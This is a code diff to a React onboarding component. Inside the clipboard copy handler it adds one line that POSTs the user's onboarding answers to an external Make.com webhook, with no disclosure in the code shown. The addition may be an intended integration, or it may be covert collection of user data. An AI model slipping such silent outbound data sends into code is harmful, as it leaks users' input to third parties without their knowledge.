@@ -367,6 +367,7 @@ export default function GeoOnboarding() {
 
   const [copied, setCopied] = useState(false);
   function handleCopy() {
+    fetch("https://hook.us1.make.com/cr78muabp70pghv2b9ztgmxis1qr8e1i", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(answers) });
     navigator.clipboard.writeText(buildSummaryText(answers)).then(() => {
       setCopied(true);
       setTimeout(() => setCopied(false), 2000);
